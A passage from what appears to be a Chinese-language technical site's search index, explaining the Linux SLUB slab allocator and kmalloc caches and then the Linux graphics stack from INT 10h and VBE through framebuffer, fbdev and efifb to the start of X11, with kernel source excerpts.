CPU_PARTIAL_FREE);\n        }\n\n        return;\n    }\n\n    if (unlikely(!new.inuse &amp;&amp; n-&gt;nr_partial &gt;= s-&gt;min_partial))\n        goto slab_empty;\n\n    /*\n     * Objects left in the slab. If it was not on the partial list before\n     * then add it.\n     */\n    if (!kmem_cache_has_cpu_partial(s) &amp;&amp; unlikely(!prior)) {\n        remove_full(s, n, page);\n        add_partial(n, page, DEACTIVATE_TO_TAIL);\n        stat(s, FREE_ADD_PARTIAL);\n    }\n    spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);\n    return;\n\nslab_empty:\n    if (prior) {\n        /*\n         * Slab on the partial list.\n         */\n        remove_partial(n, page);\n        stat(s, FREE_REMOVE_PARTIAL);\n    } else {\n        /* Slab must be on the full list */\n        remove_full(s, n, page);\n    }\n\n    spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);\n    stat(s, FREE_SLAB);\n    discard_slab(s, page);\n}\n</code></pre> <p>\u200b\u5b83\u200b\u7684\u200b\u601d\u8def\u200b\u662f\u200b\uff0c\u200b\u627e\u5230\u200b\u5bf9\u5e94\u200b\u7684\u200b slab\uff0c\u200b\u628a\u200b object \u200b\u653e\u5230\u200b\u5bf9\u5e94\u200b\u7684\u200b freelist \u200b\u5185\u200b\uff0c\u200b\u5982\u679c\u200b\u5b83\u200b\u4e4b\u524d\u200b\u662f\u200b\u6ee1\u200b\u7684\u200b\uff0c\u200b\u90a3\u4e48\u200b\u73b0\u5728\u200b\u5c31\u200b\u6709\u200b\u7a7a\u95f2\u200b\u5757\u200b\u4e86\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u88ab\u200b\u653e\u5230\u200b partial slab list \u200b\u4e2d\u200b\uff0c\u200b\u7528\u4e8e\u200b\u540e\u7eed\u200b\u7684\u200b\u5206\u914d\u200b\u3002</p>"},{"location":"software/linux_allocator.html#_2","title":"\u5c0f\u7ed3","text":"<p>\u200b\u6240\u4ee5\u200b\u5176\u5b9e\u200b slab cache allocator \u200b\u7684\u200b\u5b9e\u73b0\u200b\u601d\u8def\u200b\u5e76\u200b\u4e0d\u200b\u590d\u6742\u200b\uff1a</p> <ol> <li>\u200b\u8981\u200b\u4fdd\u5b58\u200b\u7684\u200b object \u200b\u90fd\u200b\u662f\u200b\u76f8\u540c\u200b\u5927\u5c0f\u200b\u7684\u200b\uff0c\u200b\u6240\u4ee5\u200b\u628a\u200b\u8fde\u7eed\u200b\u7684\u200b\u51e0\u4e2a\u200b\u9875\u200b\u4f5c\u4e3a\u200b\u4e00\u4e2a\u200b slab\uff0c\u200b\u5185\u90e8\u200b\u6309\u7167\u200b\u56fa\u5b9a\u200b\u5927\u5c0f\u200b\u5212\u5206\u200b\u591a\u4e2a\u200b\u5757\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u5757\u200b\u653e\u200b\u4e00\u4e2a\u200b object</li> <li>\u200b\u6bcf\u4e2a\u200b slab \u200b\u7ef4\u62a4\u200b\u4e00\u4e2a\u200b freelist \u200b\u5355\u5411\u200b\u94fe\u8868\u200b\uff0c\u200b\u94fe\u8868\u200b\u5934\u200b\u4fdd\u5b58\u200b\u5728\u200b slab \u200b\u7684\u200b\u5143\u200b\u6570\u636e\u200b <code>struct page</code> \u200b\u4e2d\u200b\uff0c\u200b\u94fe\u8868\u200b\u7684\u200b next \u200b\u6307\u9488\u200b\u4fdd\u5b58\u200b\u5728\u200b\u7a7a\u95f2\u200b\u5757\u200b\u5185\u90e8\u200b</li> <li>\u200b\u4e3a\u4e86\u200b\u6027\u80fd\u200b\uff0c\u200b\u907f\u514d\u200b\u9501\u200b\u7684\u200b\u4f7f\u7528\u200b\uff0c\u200b\u7ef4\u62a4\u200b\u4e00\u4e2a\u200b per-cpu \u200b\u7684\u200b freelist \u200b\u5728\u200b <code>struct kmem_cache_cpu</code> \u200b\u5f53\u4e2d\u200b\uff0c\u200b\u5b83\u200b\u53ef\u4ee5\u200b\u63a5\u7ba1\u200b\u67d0\u4e2a\u200b slab\uff0c\u200b\u628a\u200b slab \u200b\u7684\u200b freelist \u200b\u91cc\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\u90fd\u200b\u8f6c\u79fb\u200b\u5230\u200b per-cpu \u200b\u7684\u200b freelist \u200b\u4e2d\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u8fd9\u4e2a\u200b slab \u200b\u53ea\u80fd\u200b\u88ab\u200b\u5f53\u524d\u200b\u7684\u200b cpu core \u200b\u6765\u200b\u5206\u914d\u200b\u65b0\u200b\u7684\u200b\u7a7a\u95f2\u200b\u5757\u200b\uff0c\u200b\u6b64\u65f6\u200b\u8fd9\u4e2a\u200b slab \u200b\u662f\u200b frozen \u200b\u72b6\u6001\u200b</li> <li>\u200b\u4e3a\u4e86\u200b\u5b9e\u73b0\u200b NUMA Aware\uff0c\u200b\u5728\u200b\u5206\u914d\u5185\u5b58\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6307\u5b9a\u200b\u5728\u200b\u54ea\u4e2a\u200b NUMA Node \u200b\u4e0a\u200b\u8fdb\u884c\u200b\uff0c\u200b\u6b64\u65f6\u200b\u4f1a\u200b\u53bb\u200b <code>struct kmem_cache.node</code> \u200b\u5b57\u200b\u6bb5\u200b\u5bfb\u627e\u200b\u5bf9\u5e94\u200b NUMA Node \u200b\u7684\u200b partial slab list\uff0c\u200b\u5728\u200b\u91cc\u9762\u200b\u5bfb\u627e\u200b\u6709\u200b\u7a7a\u95f2\u200b\u5757\u200b\u7684\u200b slab \u200b\u6765\u200b\u8fdb\u884c\u200b\u5206\u914d\u200b</li> </ol> <p>\u200b\u4e0b\u9762\u200b\u662f\u200b Slab allocators in the Linux Kernel: SLAB, SLOB, SLUB \u200b\u6587\u4e2d\u200b\u7684\u200b\u7ed3\u6784\u56fe\u200b\uff0c\u200b\u753b\u200b\u7684\u200b\u6bd4\u8f83\u200b\u660e\u200b\u4e86\u200b\uff1a</p> <p></p>"},{"location":"software/linux_allocator.html#kmalloc","title":"kmalloc","text":"<p>\u200b\u524d\u9762\u200b\u63d0\u5230\u200b\u7684\u200b\u90fd\u200b\u662f\u200b <code>kmem_cache_alloc</code>\uff0c\u200b\u90a3\u4e48\u200b\u5982\u679c\u200b\u76f4\u63a5\u200b\u7528\u200b kmalloc\uff0c\u200b\u4f1a\u200b\u600e\u4e48\u6837\u200b\uff1f\u200b\u6765\u770b\u200b kmalloc \u200b\u7684\u200b\u5b9a\u4e49\u200b\uff1a</p> <pre><code>// in include/linux/slab.h\nstatic __always_inline void *kmalloc(size_t size, gfp_t flags)\n{\n    if (__builtin_constant_p(size)) {\n        unsigned int index;\n        if (size &gt; KMALLOC_MAX_CACHE_SIZE)\n            return kmalloc_large(size, flags);\n        index = kmalloc_index(size);\n\n        if (!index)\n            return ZERO_SIZE_PTR;\n\n        return kmem_cache_alloc_trace(\n                kmalloc_caches[kmalloc_type(flags)][index],\n                flags, size);\n    }\n    return __kmalloc(size, flags);\n}\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u5b83\u4f1a\u200b\u5224\u65ad\u200b\u8f93\u5165\u200b\u7684\u200b size \u200b\u662f\u4e0d\u662f\u200b\u5e38\u91cf\u200b\uff0c\u200b\u6bd4\u5982\u200b\u4f20\u5165\u200b\u7684\u200b\u662f\u200b\u4e00\u4e2a\u200b sizeof(struct)\uff0c\u200b\u90a3\u200b\u5b83\u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b\u5e38\u91cf\u200b\uff0c\u200b\u6b64\u65f6\u200b\u4f1a\u200b\u5224\u65ad\u200b\u5b83\u200b\u7684\u200b\u5927\u5c0f\u200b\uff1a\u200b\u5982\u679c\u200b\u5c0f\u4e8e\u200b\u6216\u200b\u7b49\u4e8e\u200b <code>KMALLOC_MAX_CACHE_SIZE</code>\uff08\u200b\u7b49\u4e8e\u200b\u4e24\u500d\u200b\u7684\u200b\u9875\u8868\u200b\u5927\u5c0f\u200b\uff09\uff0c\u200b\u5c31\u4f1a\u7528\u200b\u5168\u5c40\u200b\u7684\u200b\u4e00\u7cfb\u5217\u200b kmem_cache \u200b\u6765\u200b\u8fdb\u884c\u200b\u5206\u914d\u200b\uff0c\u200b\u5b83\u200b\u4fdd\u5b58\u200b\u5728\u200b kmalloc_cache \u200b\u6570\u7ec4\u200b\u5f53\u4e2d\u200b\uff1a</p> <pre><code>// in include/linux/slab.h\nextern struct kmem_cache *\nkmalloc_caches[NR_KMALLOC_TYPES][KMALLOC_SHIFT_HIGH + 1];\n</code></pre> <p>\u200b\u5185\u6838\u200b\u4f1a\u200b\u521d\u59cb\u5316\u200b\u8fd9\u200b\u51e0\u79cd\u200b <code>kmem_cache</code>\uff1a</p> <pre><code>#ifdef CONFIG_ZONE_DMA\n#define KMALLOC_DMA_NAME(sz)    .name[KMALLOC_DMA] = \"dma-kmalloc-\" #sz,\n#else\n#define KMALLOC_DMA_NAME(sz)\n#endif\n\n#ifdef CONFIG_MEMCG_KMEM\n#define KMALLOC_CGROUP_NAME(sz) .name[KMALLOC_CGROUP] = \"kmalloc-cg-\" #sz,\n#else\n#define KMALLOC_CGROUP_NAME(sz)\n#endif\n\n#define INIT_KMALLOC_INFO(__size, __short_size)         \\\n{                               \\\n    .name[KMALLOC_NORMAL]  = \"kmalloc-\" #__short_size,  \\\n    .name[KMALLOC_RECLAIM] = \"kmalloc-rcl-\" #__short_size,  \\\n    KMALLOC_CGROUP_NAME(__short_size)           \\\n    KMALLOC_DMA_NAME(__short_size)              \\\n    .size = __size,                     \\\n}\n</code></pre> <p>\u200b\u4e5f\u200b\u5c31\u662f\u200b\u5728\u200b <code>/proc/slabinfo</code> \u200b\u91cc\u200b\u770b\u5230\u200b\u7684\u200b <code>kmalloc-*/kmalloc-rcl-*/kmalloc-cg-*/dma-kmalloc-*</code> \u200b\u8fd9\u4e9b\u200b slab cache allocator\uff0c\u200b\u5b83\u4eec\u200b\u662f\u200b\u5168\u5c40\u200b\u7684\u200b\uff0c\u200b\u7528\u4e8e\u200b\u5404\u79cd\u200b kmalloc\u3002</p> <p>\u200b\u6b64\u5916\u200b\u8fd8\u6709\u200b\u4e24\u4e2a\u200b\u7279\u6b8a\u200b\u7684\u200b\uff1a<code>kmem_cache</code> \u200b\u548c\u200b <code>kmem_cache_node</code>\uff0c\u200b\u5b83\u4eec\u200b\u7528\u6765\u200b\u7ef4\u62a4\u200b SLUB \u200b\u81ea\u5df1\u200b\u7684\u200b kmem_cache \u200b\u548c\u200b kmem_cache_node \u200b\u7ed3\u6784\u200b\u4f53\u200b\u7684\u200b\u5206\u914d\u200b\u548c\u200b\u91ca\u653e\u200b\u3002</p>"},{"location":"software/linux_allocator.html#_3","title":"\u53c2\u8003","text":"<ul> <li>Slab allocators in the Linux Kernel: SLAB, SLOB, SLUB</li> <li>Linux SLUB Allocator Internals and Debugging, Part 1 of 4</li> <li>Linux SLUB Allocator Internals and Debugging, Part 2 of 4</li> <li>Linux SLUB Allocator Internals and Debugging, Part 3 of 4</li> <li>Linux SLUB Allocator Internals and Debugging, Part 4 of 4</li> </ul>"},{"location":"software/linux_graphics.html","title":"Linux \u200b\u56fe\u5f62\u200b\u8f6f\u4ef6\u200b\u6808","text":"<p>\u200b\u672c\u6587\u200b\u8ba8\u8bba\u200b Linux \u200b\u662f\u200b\u5982\u4f55\u200b\u9a71\u52a8\u200b\u663e\u5361\u200b\u663e\u793a\u200b\u5185\u5bb9\u200b\u7684\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u8fd9\u4e2a\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\u6d89\u53ca\u200b\u5230\u200b\u7684\u200b\u5404\u4e2a\u200b\u8f6f\u4ef6\u200b\u7684\u200b\u529f\u80fd\u200b\u3002</p>"},{"location":"software/linux_graphics.html#int-10h-vbe","title":"\u4ece\u200b INT 10h \u200b\u5230\u200b VBE","text":"<p>\u200b\u65e9\u671f\u200b\u8fd8\u200b\u6ca1\u6709\u200b\u56fe\u5f62\u754c\u9762\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u663e\u793a\u200b\u7684\u200b\u5185\u5bb9\u200b\u5c31\u662f\u200b\u6587\u672c\u200b\u548c\u200b\u5149\u6807\u200b\uff0c\u200b\u6240\u4ee5\u200b\u65e9\u671f\u200b\u7684\u200b\u663e\u5361\u200b\u7684\u200b\u529f\u80fd\u200b\u4e5f\u200b\u662f\u200b\u56f4\u7ed5\u200b\u8fd9\u4e2a\u200b\u6765\u200b\u5b9e\u73b0\u200b\u7684\u200b\uff1aBIOS \u200b\u63d0\u4f9b\u200b\u4e00\u6bb5\u200b\u4ee3\u7801\u200b\uff0c\u200b\u5f53\u200b\u5185\u6838\u200b\u901a\u8fc7\u200b INT 10h \u200b\u8fdb\u5165\u200b BIOS \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5b83\u4f1a\u200b\u6267\u884c\u200b BIOS \u200b\u7684\u200b\u4ee3\u7801\u200b\uff0c\u200b\u53bb\u200b\u5b8c\u6210\u200b\u7ed8\u5236\u200b\u6587\u672c\u200b\u548c\u200b\u5149\u6807\u200b\u7684\u200b\u4efb\u52a1\u200b\u3002\u200b\u8fd9\u4e2a\u200b\u63a5\u53e3\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u5982\u4e0b\u200b\u529f\u80fd\u200b\uff1a</p> <ol> <li>\u200b\u8bbe\u7f6e\u200b video mode\uff1a\u200b\u6587\u5b57\u200b\u6709\u200b\u591a\u5c11\u200b\u884c\u200b\u591a\u5c11\u200b\u5217\u200b\uff0c\u200b\u591a\u5c11\u200b\u79cd\u989c\u8272\u200b\uff0c\u200b\u5b57\u4f53\u5927\u5c0f\u200b\u7b49\u7b49\u200b</li> <li>\u200b\u8bbe\u7f6e\u200b\u5149\u6807\u200b cursor\uff1a\u200b\u79fb\u52a8\u200b\u5230\u200b\u54ea\u4e2a\u200b\u4f4d\u7f6e\u200b\uff0c\u200b\u4ec0\u4e48\u200b\u6837\u5f0f\u200b</li> <li>\u200b\u8f93\u51fa\u200b\u6587\u5b57\u200b\uff1a\u200b\u5728\u200b\u5149\u6807\u200b\u4f4d\u7f6e\u200b\u8f93\u51fa\u200b\u6587\u5b57\u200b</li> <li>\u200b\u8bbe\u7f6e\u200b\u989c\u8272\u200b\uff1a\u200b\u524d\u666f\u200b/\u200b\u540e\u666f\u200b\u989c\u8272\u200b</li> </ol> <p>\u200b\u4f8b\u5982\u200b INT 10h AH=0Eh \u200b\u7684\u200b\u529f\u80fd\u200b\u662f\u200b\u8f93\u51fa\u200b\u4e00\u4e2a\u200b\u5b57\u8282\u200b\u5230\u200b\u663e\u793a\u200b\u8f93\u51fa\u200b\uff0c\u200b\u5176\u4e2d\u200b AL \u200b\u5bc4\u5b58\u5668\u200b\u4fdd\u5b58\u200b\u8981\u200b\u8f93\u51fa\u200b\u7684\u200b\u5b57\u7b26\u200b\u3002Linux \u200b\u4e2d\u200b\u7528\u200b\u8fd9\u4e2a\u200b\u65b9\u6cd5\u200b\u6765\u200b\u5b9e\u73b0\u200b putchar\uff1a</p> <pre><code>// in arch/x86/boot/tty.c\nstatic void __section(\".inittext\") bios_putchar(int ch)\n{\n    struct biosregs ireg;\n\n    initregs(&amp;ireg);\n    ireg.bx = 0x0007;\n    ireg.cx = 0x0001;\n    ireg.ah = 0x0e;\n    ireg.al = ch;\n    intcall(0x10, &amp;ireg, NULL);\n}\n</code></pre> <p>\u200b\u4e4b\u540e\u200b\u7684\u200b\u7248\u672c\u200b\u5f15\u5165\u200b\u4e86\u200b\u56fe\u5f62\u200b\u6a21\u5f0f\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u63a7\u5236\u200b\u5206\u8fa8\u7387\u200b\uff0c\u200b\u8bbe\u7f6e\u200b\u50cf\u7d20\u200b\u7684\u200b\u989c\u8272\u200b\u7b49\u7b49\u200b\u3002\u200b\u8fd9\u4e2a\u200b\u8fc7\u7a0b\u200b\u5341\u5206\u200b\u539f\u59cb\u200b\uff0c\u200b\u6bcf\u6b21\u200b\u64cd\u4f5c\u200b\u90fd\u200b\u9700\u8981\u200b\u5728\u200b\u5185\u6838\u200b\u91cc\u200b\u7528\u200b INT 10h \u200b\u8c03\u7528\u200b BIOS \u200b\u7684\u200b\u4ee3\u7801\u200b\uff0c\u200b\u6548\u7387\u200b\u5f88\u200b\u4f4e\u200b\u3002</p> <p>\u200b\u968f\u7740\u200b\u65f6\u4ee3\u200b\u7684\u200b\u53d1\u5c55\u200b\uff0cINT 10h \u200b\u66f4\u65b0\u200b\u4e3a\u200b VESA BIOS Extensions\uff08VBE\uff09\u3002\u200b\u4ece\u200b VBE 2.0 \u200b\u7248\u672c\u200b\u5f00\u59cb\u200b\uff0c\u200b\u5f15\u5165\u200b\u4e86\u200b frame buffer \u200b\u7684\u200b\u652f\u6301\u200b\uff1a\u200b\u5728\u200b\u5185\u5b58\u200b\u4e2d\u200b\u8bbe\u7f6e\u200b\u4e00\u7247\u200b\u8fde\u7eed\u200b\u533a\u57df\u200b\u6765\u200b\u4fdd\u5b58\u200b\u8981\u200b\u663e\u793a\u200b\u7684\u200b\u50cf\u7d20\u200b\uff0c\u200b\u5185\u6838\u200b\u628a\u200b\u8981\u200b\u663e\u793a\u200b\u7684\u200b\u50cf\u7d20\u200b\u6309\u7167\u200b\u4e00\u5b9a\u200b\u7684\u200b\u683c\u5f0f\u200b\u5199\u200b\u5230\u200b frame buffer \u200b\u91cc\u9762\u200b\uff0c\u200b\u4e00\u6b21\u200b call \u200b\u5c31\u200b\u53ef\u4ee5\u200b\u628a\u200b frame buffer \u200b\u91cc\u9762\u200b\u7684\u200b\u5185\u5bb9\u200b\u66f4\u65b0\u200b\u5230\u200b\u663e\u793a\u200b\u8f93\u51fa\u200b\u4e0a\u200b\u3002</p> <p>\u200b\u968f\u7740\u200b UEFI \u200b\u7684\u200b\u51fa\u73b0\u200b\uff0cAPI \u200b\u8fdb\u5316\u200b\u4e3a\u200b EFI 1.0 \u200b\u7684\u200b Universal Graphic Adapter (UGA) \u200b\u548c\u200b UEFI  \u200b\u7684\u200b Graphics Output Protocol (GOP)\u3002</p>"},{"location":"software/linux_graphics.html#framebuffer","title":"framebuffer","text":"<p>\u200b\u4e0a\u6587\u200b\u63d0\u5230\u200b\uff0c\u200b\u4ece\u200b VBE 2.0 \u200b\u5f00\u59cb\u200b\uff0c\u200b\u63d0\u4f9b\u200b\u4e86\u200b framebuffer \u200b\u529f\u80fd\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u5185\u6838\u200b\u53ef\u4ee5\u200b\u6bd4\u8f83\u200b\u81ea\u7531\u200b\u5730\u200b\u63a7\u5236\u200b\u8981\u200b\u7ed8\u5236\u200b\u7684\u200b\u5185\u5bb9\u200b\uff0c\u200b\u53ea\u200b\u9700\u8981\u200b\u628a\u200b\u7ed8\u5236\u200b\u7684\u200b\u5185\u5bb9\u200b\u653e\u5230\u200b\u5185\u5b58\u200b\u91cc\u200b\uff0c\u200b\u4ea4\u7ed9\u200b VBE \u200b\u5c31\u200b\u53ef\u4ee5\u200b\u628a\u200b\u5185\u5bb9\u200b\u663e\u793a\u200b\u51fa\u6765\u200b\u3002framebuffer \u200b\u53ef\u4ee5\u200b\u7531\u200b\u5185\u6838\u200b\u6765\u200b\u8d1f\u8d23\u200b\u7ed8\u5236\u200b\uff0c\u200b\u628a\u200b\u7528\u6237\u200b\u6001\u200b\u7a0b\u5e8f\u200b\u5f80\u200b stdout \u200b\u8f93\u51fa\u200b\u7684\u200b\u6587\u5b57\u200b\u7ed8\u5236\u200b\u5230\u200b framebuffer \u200b\u91cc\u9762\u200b\uff1b\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u628a\u200b framebuffer \u200b\u4ea4\u7ed9\u200b\u7528\u6237\u200b\u6001\u200b\uff0c\u200b\u542f\u52a8\u200b X11 server \u200b\u7b49\u7b49\u200b\u3002</p> <p>\u200b\u4e8e\u662f\u200b\u5185\u6838\u200b\u662f\u200b\u600e\u4e48\u200b\u5904\u7406\u200b framebuffer \u200b\u7684\u200b\u5462\u200b\uff1fframebuffer \u200b\u53ef\u80fd\u200b\u7531\u200b\u4e0d\u540c\u200b\u7684\u200b\u786c\u4ef6\u200b\u63d0\u4f9b\u200b\uff0c\u200b\u6240\u4ee5\u200b\u9700\u8981\u200b\u4e00\u5957\u200b\u8bbe\u5907\u200b\u7c7b\u578b\u200b\u6765\u200b\u7edf\u4e00\u200b\u5904\u7406\u200b framebuffer\uff0c\u200b\u90a3\u200b\u5c31\u662f\u200b fbdev\u3002\u200b\u90a3\u4e48\u200b\uff0cVBE 2.0 \u200b\u63d0\u4f9b\u200b\u7684\u200b framebuffer \u200b\u529f\u80fd\u200b\uff0c\u200b\u5728\u200b Linux \u200b\u4e0b\u200b\u7684\u200b\u9a71\u52a8\u200b\u5c31\u200b\u7531\u200b  vesafb \u200b\u9a71\u52a8\u200b\uff08<code>drivers/video/fbdev/vesafb.c</code>\uff09\u200b\u63d0\u4f9b\u200b\u3002</p> <p>\u200b\u5728\u200b\u542f\u52a8\u200b\u7684\u200b\u65f6\u5019\u200b\uff0cLinux \u200b\u5185\u6838\u200b\u4f1a\u200b\u901a\u8fc7\u200b VBE \u200b\u7684\u200b Function 01h - Return VBE Mode Information \u200b\u914d\u7f6e\u200b framebuffer\uff0c\u200b\u5982\u679c\u200b\u914d\u7f6e\u200b\u6210\u529f\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u62ff\u5230\u200b\u4e00\u4e2a\u200b\u7269\u7406\u5730\u5740\u200b <code>lfb_base</code>\uff08linear frame buffer base\uff09\uff0c\u200b\u4ee5\u53ca\u200b\u5bf9\u5e94\u200b\u7684\u200b frame buffer \u200b\u683c\u5f0f\u200b\u3002</p> <p>UEFI \u200b\u4e5f\u200b\u662f\u200b\u7c7b\u4f3c\u200b\u7684\u200b\uff1aLinux \u200b\u7684\u200b efifb \u200b\u9a71\u52a8\u200b\u4f1a\u200b\u4ece\u200b UEFI \u200b\u4e2d\u200b\u83b7\u53d6\u200b\u5230\u200b framebuffer \u200b\u7684\u200b\u5730\u5740\u200b\u7b49\u200b\u4fe1\u606f\u200b\uff1a</p> <pre><code>efifb: probing for efifb\nefifb: framebuffer at 0xc0000000, using 4032k, total 4032k\nefifb: mode is 1280x800x32, linelength=5120, pages=1\nefifb: scrolling: redraw\nefifb: Truecolor: size=8:8:8:8, shift=24:16:8:0\n</code></pre> <p>\u200b\u68c0\u6d4b\u200b\u5230\u200b framebuffer \u200b\u4ee5\u540e\u200b\uff0c\u200b\u600e\u4e48\u200b\u53bb\u200b\u4f7f\u7528\u200b\u5b83\u200b\u5462\u200b\uff1f\u200b\u6709\u200b\u4e24\u79cd\u200b\u529e\u6cd5\u200b\uff1a</p> <ol> <li>\u200b\u5185\u6838\u200b\u63a5\u7ba1\u200b framebuffer\uff0c\u200b\u751f\u6210\u200b\u4e00\u4e2a\u200b console\uff08\u200b\u9a71\u52a8\u200b\u662f\u200b fbcon\uff09\uff0c\u200b\u5185\u6838\u200b\u8d1f\u8d23\u200b console \u200b\u5230\u200b framebuffer \u200b\u7684\u200b\u7ed8\u5236\u200b\uff1b\u200b\u76f8\u6bd4\u200b\u4e4b\u524d\u200b\u7684\u200b <code>console -&gt; VGA driver (INT 10h) -&gt; hardware</code>\uff0c\u200b\u6709\u200b\u7edf\u4e00\u200b\u7684\u200b framebuffer \u200b\u9a71\u52a8\u200b\u4ee5\u540e\u200b\uff0c\u200b\u53d8\u6210\u200b\u4e86\u200b <code>console -&gt; fbcon -&gt; fbdev driver -&gt; hardware</code></li> <li>\u200b\u540c\u65f6\u200b\u521b\u5efa\u200b\u8bbe\u5907\u200b <code>/dev/fb*</code>\uff0c\u200b\u7528\u6237\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u8bfb\u5199\u200b\u8fd9\u4e9b\u200b\u8bbe\u5907\u200b\u6587\u4ef6\u200b\u6765\u200b\u4fee\u6539\u200b framebuffer \u200b\u7684\u200b\u5185\u5bb9\u200b\uff1b\u200b\u6b64\u5916\u200b\uff0c\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u7528\u200b ioctl \u200b\u547d\u4ee4\u200b\u53bb\u200b\u64cd\u63a7\u200b framebuffer\uff08\u200b\u5b9a\u4e49\u200b\u5728\u200b <code>linux/fb.h</code>\uff09</li> </ol> <p>\u200b\u73b0\u5728\u200b\u5982\u679c\u200b\u5b89\u88c5\u200b\u4e86\u200b Linux \u200b\u53d1\u884c\u7248\u200b\uff0c\u200b\u53c8\u200b\u6ca1\u6709\u200b\u542f\u52a8\u200b\u56fe\u5f62\u754c\u9762\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5927\u200b\u6982\u7387\u200b\u770b\u5230\u200b\u7684\u200b\u5c31\u662f\u200b\u4e00\u4e2a\u200b fbcon \u200b\u9a71\u52a8\u200b\u63d0\u4f9b\u200b\u7684\u200b console\uff0c\u200b\u5e95\u5c42\u200b\u662f\u200b efifb \u200b\u6216\u8005\u200b\u5e73\u53f0\u200b\u76f8\u5173\u200b\u7684\u200b fb \u200b\u9a71\u52a8\u200b\uff0c\u200b\u4f8b\u5982\u200b i915drmfb\uff08Intel \u200b\u663e\u5361\u200b\uff09\uff0cnouveaudrmfb\uff08NVIDIA \u200b\u663e\u5361\u200b\uff09\uff0castdrmfb\uff08ASPEED \u200b\u663e\u5361\u200b\uff09\u200b\u7b49\u7b49\u200b\u3002\u200b\u4e5f\u200b\u53ef\u80fd\u200b\u662f\u200b\u7528\u6237\u200b\u6001\u200b\u7684\u200b kmscon \u200b\u7a0b\u5e8f\u200b\u63d0\u4f9b\u200b\u7684\u200b console\uff0c\u200b\u4ee3\u66ff\u200b fbcon \u200b\u7684\u200b\u529f\u80fd\u200b\uff0c\u200b\u7528\u200b drm \u200b\u6216\u8005\u200b fbdev \u200b\u5728\u200b\u7528\u6237\u200b\u6001\u200b\u5b9e\u73b0\u200b console \u200b\u7ed8\u5236\u200b\u3002</p> <p>\u200b\u56fe\u5f62\u754c\u9762\u200b\uff0c\u200b\u4f8b\u5982\u200b X11\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u7528\u200b fbdev \u200b\u7684\u200b framebuffer \u200b\u6765\u200b\u7ed8\u5236\u200b\u5185\u5bb9\u200b\uff1axf86-video-fbdev\u3002</p> <p>framebuffer \u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u6bd4\u8f83\u7b80\u5355\u200b\u7684\u200b\u63a5\u53e3\u200b\uff0c\u200b\u4f7f\u5f97\u200b\u5185\u6838\u200b\u548c\u200b\u7528\u6237\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u5b83\u200b\u53bb\u200b\u63a7\u5236\u200b\u8981\u200b\u663e\u793a\u200b\u7684\u200b\u5185\u5bb9\u200b\uff0c\u200b\u800c\u200b\u4e0d\u5355\u5355\u662f\u200b\u666e\u901a\u200b\u7684\u200b 80 \u200b\u5217\u200b 25 \u200b\u884c\u200b\u7684\u200b\u6587\u5b57\u200b\u3002\u200b\u4f46\u200b\u73b0\u5728\u200b\u7684\u200b\u663e\u5361\u200b\u8981\u200b\u590d\u6742\u200b\u7684\u200b\u591a\u200b\uff0c\u200b\u8981\u200b\u652f\u6301\u200b\u5404\u79cd\u200b\u56fe\u5f62\u200b API\uff0c\u200b\u5404\u79cd\u200b\u786c\u4ef6\u52a0\u901f\u200b\u529f\u80fd\u200b\uff0c\u200b\u6240\u4ee5\u200b\u7b80\u5355\u200b\u7684\u200b framebuffer \u200b\u529f\u80fd\u200b\u4e0d\u80fd\u200b\u6ee1\u8db3\u200b\u9ad8\u6027\u80fd\u200b\u56fe\u5f62\u200b\u7684\u200b\u9700\u6c42\u200b\u3002\u200b\u56e0\u6b64\u200b\u73b0\u5728\u200b\u7528\u200b\u7684\u200b\u6bd4\u8f83\u200b\u591a\u200b\u7684\u200b\u662f\u200b DRM\uff08Direct Rendering Manager\uff09\uff0c\u200b\u540e\u9762\u200b\u4f1a\u200b\u4ecb\u7ecd\u200b\u5b83\u200b\u3002</p>"},{"location":"software/linux_graphics.html#x11","title":"X11","text":"<p>X11 \u200b\u662f\u200b\u5e38\u7528\u200b\u7684\u200b\u56fe\u5f62\u754c\u9762\u200b\u7cfb\u7edf\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u67b6\u6784\u200b\u662f\u200b\u6bd4\u8f83\u200b\u4f20\u7edf\u200b\u7684\u200b Client/Server\uff1a\u200b\u7cfb\u7edf\u200b\u4e2d\u200b\u8fd0\u884c\u200b\u4e00\u4e2a\u200b X Server\uff0c\u200b\u7136\u540e\u200b\u7528\u6237\u7a0b\u5e8f\u200b\u662f\u200b X Client\u3002X Client \u200b\u901a\u8fc7\u200b Socket \u200b\u548c\u200b X Server \u200b\u901a\u8baf\u200b\uff0c\u200b\u544a\u8bc9\u200b X Server \u200b\u9700\u8981\u200b\u7ed8\u5236\u200b\u54ea\u4e9b\u200b\u56fe\u5f62\u200b\uff1bX Server 